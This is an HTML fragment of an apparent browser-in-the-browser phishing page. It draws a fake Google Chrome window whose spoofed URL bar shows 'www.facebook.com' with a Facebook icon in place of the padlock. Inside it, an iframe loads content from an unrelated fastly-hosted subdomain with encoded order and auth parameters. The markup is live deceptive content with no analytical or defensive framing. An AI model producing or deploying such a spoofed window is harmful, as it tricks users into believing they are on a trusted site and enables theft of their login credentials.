<body>
<div id="window">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="./chrome.svg" width="20px" height="15px" id="logo">
			<span id="logo-description">Google Chrome</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./facebook.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">www.facebook.com</span>
		<span id="domain-path"></span>
	</div>
</div>
<!-- Content start -->
<iframe id="content" src="http://qgqkc.japscan.me.global.prod.fastly.net/MzYyZGQ4ZmRjMzVhYTZhNmMyODE0Zg==/?type=x1&orders=780783326&auth=ODA3OGYzOWM0NTFlNTkzMTdjMjQ0Mg==" frameBorder="0"></iframe>
</div>

</html>
